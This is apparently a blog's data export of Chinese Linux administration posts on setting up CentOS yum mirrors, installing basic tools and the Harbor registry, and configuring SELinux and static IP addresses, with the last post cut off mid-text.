class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"配置阿里yum源\"><a href=\"#配置阿里yum源\" class=\"headerlink\" title=\"配置阿里yum源\"></a>配置阿里yum源</h3><ol>\n<li>首先保证虚拟机可以正常访问网络。</li>\n<li>执行命令，下载yum源。(CENTOS-7)</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>\n\n<p>CENTOS-8 yum源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ol start=\"3\">\n<li>清除yum缓存，重新生成。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum clean all &amp;&amp; yum makecache</span><br></pre></td></tr></table></figure>\n\n<p>PS:</p>\n<p><strong>CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。</strong></p>\n<h3 id=\"必备的软件\"><a href=\"#必备的软件\" class=\"headerlink\" title=\"必备的软件\"></a>必备的软件</h3><ol>\n<li><strong>vim工具</strong>，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y vim</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>wget</strong>工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y wget</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>bash-completion</strong>包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y bash-completion</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>tree工具</strong>，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y tree</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>net-tools</strong>，这个工具提供了比如<code>ifconfig</code>，<code>netstat</code>，<code>arp</code>，<code>route</code>命令，有时候用起来发现没有这个命令的话，记得安装这个包。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y net-tools</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>lsof工具</strong>，查看端口监听的常用工具，个人来讲使用频率高于<code>netstat</code>，使用也比较方便，可以安装一个。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y lsof</span><br></pre></td></tr></table></figure>\n\n<p>配置完这些，基础的东西就可以告一段落了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"配置阿里yum源\"><a href=\"#配置阿里yum源\" class=\"headerlink\" title=\"配置阿里yum源\"></a>配置阿里yum源</h3><ol>\n<li>首先保证虚拟机可以正常访问网络。</li>\n<li>执行命令，下载yum源。(CENTOS-7)</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>\n\n<p>CENTOS-8 yum源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -o /etc/yum.repos.d/aliyun.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>","more":"<ol start=\"3\">\n<li>清除yum缓存，重新生成。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum clean all &amp;&amp; yum makecache</span><br></pre></td></tr></table></figure>\n\n<p>PS:</p>\n<p><strong>CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。</strong></p>\n<h3 id=\"必备的软件\"><a href=\"#必备的软件\" class=\"headerlink\" title=\"必备的软件\"></a>必备的软件</h3><ol>\n<li><strong>vim工具</strong>，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y vim</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>wget</strong>工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y wget</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>bash-completion</strong>包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y bash-completion</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>tree工具</strong>，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y tree</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>net-tools</strong>，这个工具提供了比如<code>ifconfig</code>，<code>netstat</code>，<code>arp</code>，<code>route</code>命令，有时候用起来发现没有这个命令的话，记得安装这个包。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y net-tools</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>lsof工具</strong>，查看端口监听的常用工具，个人来讲使用频率高于<code>netstat</code>，使用也比较方便，可以安装一个。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y lsof</span><br></pre></td></tr></table></figure>\n\n<p>配置完这些，基础的东西就可以告一段落了。</p>"},{"title":"Linux安装harbor","date":"2023-04-07T01:04:00.000Z","_content":"### 安装准备\n\n1. 首先下载harbor的包，我使用的是v2.8.0版本的。自己创建一个barbor目录,并且进入此目录，执行以下命令。\n\n```bash\nwget -c https://github.com/goharbor/harbor/releases/download/v2.8.0-rc1/harbor-offline-installer-v2.8.0-rc1.tgz\n```\n\n### 解压包\n\n2. 下载完成后，执行以下命令进行解压。\n\n<!-- more -->\n\n```bash\ntar -zxvf harbor-offline-installer-v2.8.0-rc1.tgz \n```\n\n### 修改配置文件\n\n3. 解压完成后，会多出来一个harbor目录，进入之后先对原始的配置文件进行拷贝。之后编辑.yml文件，这才是最终harbor会用到的文件。\n\n```bash\ncp harbor.yml.tmpl harbor.yml\n```\n\n按照自己的意愿修改端口和登录密码，其他的不用修改，最后保存退出。\n\n![](./linux-install-harbor/1.png)\n\n![](./linux-install-harbor/2.png)\n\n### 执行可执行文件\n\n4. 修改完成配置文件后，执行以下命令，之后会根据.yml文件***生成很多容器***。\n\n```bash\n./install.sh \n```\n\n等待容器生成，这个时候可以通过浏览器输入IP:port的方式进行访问了，但是如果是在别的主机上进行docker login IP 的方式，输入user和passwd会出现报错，有几种报错忘记了，但是通过以下几个操作一般可以解决。\n\n### 报错解决\n\n5. 在主机上进行登录的时候忘记输入端口号\n\n```bash\ndocker login 192.168.20.10:8080\n```\n\n6. 生成容器后没有重启docker服务，可以通过一下两条命令进行重启docker服务。\n\n```bash\nsystemctl daemon-reload\n```\n\n```bash\nsystemctl restart docker\n```\n\n7. 最后一条也是最重要的一条，一定要检查执行install.sh脚本后，生成的容器是否都处于运行的状态。因为经常有一些容器没有运行起来，我手头这边就出现两个容器没有运行起来。\n\n![](./linux-install-harbor/3.png)\n\n执行以下命令查看运行的/运行过的容器。\n\n```bash\ndocker ps -a\n```\n\n执行以下命令重启容器\n\n```bash\ndocker restart '容器ID'\n```\n\n最后可以再检查一下容器的状态，确保每一个都是up起来的，并且都是healthy状态。都进行完成后，浏览器也好，主机也好，应该都可以进行登录了。","source":"_posts/linux-install-harbor.md","raw":"---\ntitle: Linux安装harbor\ndate: 2023-04-07 09:04:00\ncategories: \n  - 学习过程\ntags: \n  - Docker\n---\n### 安装准备\n\n1. 首先下载harbor的包，我使用的是v2.8.0版本的。自己创建一个barbor目录,并且进入此目录，执行以下命令。\n\n```bash\nwget -c https://github.com/goharbor/harbor/releases/download/v2.8.0-rc1/harbor-offline-installer-v2.8.0-rc1.tgz\n```\n\n### 解压包\n\n2. 下载完成后，执行以下命令进行解压。\n\n<!-- more -->\n\n```bash\ntar -zxvf harbor-offline-installer-v2.8.0-rc1.tgz \n```\n\n### 修改配置文件\n\n3. 解压完成后，会多出来一个harbor目录，进入之后先对原始的配置文件进行拷贝。之后编辑.yml文件，这才是最终harbor会用到的文件。\n\n```bash\ncp harbor.yml.tmpl harbor.yml\n```\n\n按照自己的意愿修改端口和登录密码，其他的不用修改，最后保存退出。\n\n![](./linux-install-harbor/1.png)\n\n![](./linux-install-harbor/2.png)\n\n### 执行可执行文件\n\n4. 修改完成配置文件后，执行以下命令，之后会根据.yml文件***生成很多容器***。\n\n```bash\n./install.sh \n```\n\n等待容器生成，这个时候可以通过浏览器输入IP:port的方式进行访问了，但是如果是在别的主机上进行docker login IP 的方式，输入user和passwd会出现报错，有几种报错忘记了，但是通过以下几个操作一般可以解决。\n\n### 报错解决\n\n5. 在主机上进行登录的时候忘记输入端口号\n\n```bash\ndocker login 192.168.20.10:8080\n```\n\n6. 生成容器后没有重启docker服务，可以通过一下两条命令进行重启docker服务。\n\n```bash\nsystemctl daemon-reload\n```\n\n```bash\nsystemctl restart docker\n```\n\n7. 最后一条也是最重要的一条，一定要检查执行install.sh脚本后，生成的容器是否都处于运行的状态。因为经常有一些容器没有运行起来，我手头这边就出现两个容器没有运行起来。\n\n![](./linux-install-harbor/3.png)\n\n执行以下命令查看运行的/运行过的容器。\n\n```bash\ndocker ps -a\n```\n\n执行以下命令重启容器\n\n```bash\ndocker restart '容器ID'\n```\n\n最后可以再检查一下容器的状态，确保每一个都是up起来的，并且都是healthy状态。都进行完成后，浏览器也好，主机也好，应该都可以进行登录了。","slug":"linux-install-harbor","published":1,"updated":"2024-05-03T03:55:54.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g1006t7zj3cmgq3y57","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"安装准备\"><a href=\"#安装准备\" class=\"headerlink\" title=\"安装准备\"></a>安装准备</h3><ol>\n<li>首先下载harbor的包，我使用的是v2.8.0版本的。自己创建一个barbor目录,并且进入此目录，执行以下命令。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -c https://github.com/goharbor/harbor/releases/download/v2.8.0-rc1/harbor-offline-installer-v2.8.0-rc1.tgz</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解压包\"><a href=\"#解压包\" class=\"headerlink\" title=\"解压包\"></a>解压包</h3><ol start=\"2\">\n<li>下载完成后，执行以下命令进行解压。</li>\n</ol>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxvf harbor-offline-installer-v2.8.0-rc1.tgz </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h3><ol start=\"3\">\n<li>解压完成后，会多出来一个harbor目录，进入之后先对原始的配置文件进行拷贝。之后编辑.yml文件，这才是最终harbor会用到的文件。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> harbor.yml.tmpl harbor.yml</span><br></pre></td></tr></table></figure>\n\n<p>按照自己的意愿修改端口和登录密码，其他的不用修改，最后保存退出。</p>\n<p><img src=\"/2023/04/07/linux-install-harbor/1.png\"></p>\n<p><img src=\"/2023/04/07/linux-install-harbor/2.png\"></p>\n<h3 id=\"执行可执行文件\"><a href=\"#执行可执行文件\" class=\"headerlink\" title=\"执行可执行文件\"></a>执行可执行文件</h3><ol start=\"4\">\n<li>修改完成配置文件后，执行以下命令，之后会根据.yml文件<em><strong>生成很多容器</strong></em>。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./install.sh </span><br></pre></td></tr></table></figure>\n\n<p>等待容器生成，这个时候可以通过浏览器输入IP:port的方式进行访问了，但是如果是在别的主机上进行docker login IP 的方式，输入user和passwd会出现报错，有几种报错忘记了，但是通过以下几个操作一般可以解决。</p>\n<h3 id=\"报错解决\"><a href=\"#报错解决\" class=\"headerlink\" title=\"报错解决\"></a>报错解决</h3><ol start=\"5\">\n<li>在主机上进行登录的时候忘记输入端口号</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login 192.168.20.10:8080</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>生成容器后没有重启docker服务，可以通过一下两条命令进行重启docker服务。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>最后一条也是最重要的一条，一定要检查执行install.sh脚本后，生成的容器是否都处于运行的状态。因为经常有一些容器没有运行起来，我手头这边就出现两个容器没有运行起来。</li>\n</ol>\n<p><img src=\"/2023/04/07/linux-install-harbor/3.png\"></p>\n<p>执行以下命令查看运行的&#x2F;运行过的容器。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure>\n\n<p>执行以下命令重启容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart <span class=\"string\">&#x27;容器ID&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>最后可以再检查一下容器的状态，确保每一个都是up起来的，并且都是healthy状态。都进行完成后，浏览器也好，主机也好，应该都可以进行登录了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"安装准备\"><a href=\"#安装准备\" class=\"headerlink\" title=\"安装准备\"></a>安装准备</h3><ol>\n<li>首先下载harbor的包，我使用的是v2.8.0版本的。自己创建一个barbor目录,并且进入此目录，执行以下命令。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -c https://github.com/goharbor/harbor/releases/download/v2.8.0-rc1/harbor-offline-installer-v2.8.0-rc1.tgz</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解压包\"><a href=\"#解压包\" class=\"headerlink\" title=\"解压包\"></a>解压包</h3><ol start=\"2\">\n<li>下载完成后，执行以下命令进行解压。</li>\n</ol>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxvf harbor-offline-installer-v2.8.0-rc1.tgz </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h3><ol start=\"3\">\n<li>解压完成后，会多出来一个harbor目录，进入之后先对原始的配置文件进行拷贝。之后编辑.yml文件，这才是最终harbor会用到的文件。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> harbor.yml.tmpl harbor.yml</span><br></pre></td></tr></table></figure>\n\n<p>按照自己的意愿修改端口和登录密码，其他的不用修改，最后保存退出。</p>\n<p><img src=\"/2023/04/07/linux-install-harbor/1.png\"></p>\n<p><img src=\"/2023/04/07/linux-install-harbor/2.png\"></p>\n<h3 id=\"执行可执行文件\"><a href=\"#执行可执行文件\" class=\"headerlink\" title=\"执行可执行文件\"></a>执行可执行文件</h3><ol start=\"4\">\n<li>修改完成配置文件后，执行以下命令，之后会根据.yml文件<em><strong>生成很多容器</strong></em>。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./install.sh </span><br></pre></td></tr></table></figure>\n\n<p>等待容器生成，这个时候可以通过浏览器输入IP:port的方式进行访问了，但是如果是在别的主机上进行docker login IP 的方式，输入user和passwd会出现报错，有几种报错忘记了，但是通过以下几个操作一般可以解决。</p>\n<h3 id=\"报错解决\"><a href=\"#报错解决\" class=\"headerlink\" title=\"报错解决\"></a>报错解决</h3><ol start=\"5\">\n<li>在主机上进行登录的时候忘记输入端口号</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker login 192.168.20.10:8080</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>生成容器后没有重启docker服务，可以通过一下两条命令进行重启docker服务。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>最后一条也是最重要的一条，一定要检查执行install.sh脚本后，生成的容器是否都处于运行的状态。因为经常有一些容器没有运行起来，我手头这边就出现两个容器没有运行起来。</li>\n</ol>\n<p><img src=\"/2023/04/07/linux-install-harbor/3.png\"></p>\n<p>执行以下命令查看运行的&#x2F;运行过的容器。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure>\n\n<p>执行以下命令重启容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart <span class=\"string\">&#x27;容器ID&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>最后可以再检查一下容器的状态，确保每一个都是up起来的，并且都是healthy状态。都进行完成后，浏览器也好，主机也好，应该都可以进行登录了。</p>"},{"title":"Linux使用小tips","date":"2023-05-18T09:26:10.000Z","_content":"\n### 常用的一些操作\n\n1. 永久修改SELINUX值。\n\n使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置```setenforce 0```就太麻烦了。所以直接编辑```/etc/selinux/config```文件，设置```SELINUX=permissive```，最后保存退出。\n\n2. 永久修改网卡的IP地址。\n\n在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。\n\n<!-- more -->\n\n网卡配置文件```/etc/sysconfig/network-scripts/ifcfg-ens160```。分成几点来说。\n\n* BOOTPROTO=none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。\n\n* ONBOOT=yes，设置开机网卡自启的，建议设置为*yes*，可选值还有*no*\n\n* 如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上\n\n```bash\nIPADDR=192.168.20.10    # *设置IP*\nGATEWAY=192.168.20.254    # *设置网关*\nPREFIX=24    # *设置子网掩码*\n```\n\n有的配置文件还可以看到\n\n```bash\nDNS1=8.8.8.8\nDNS2=114.144.144.114\n```\n\n但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（```/etc/resolv.conf```），二就是它会和```/etc/resolv.conf```文件指定的DNS相互冲突。\n\n* 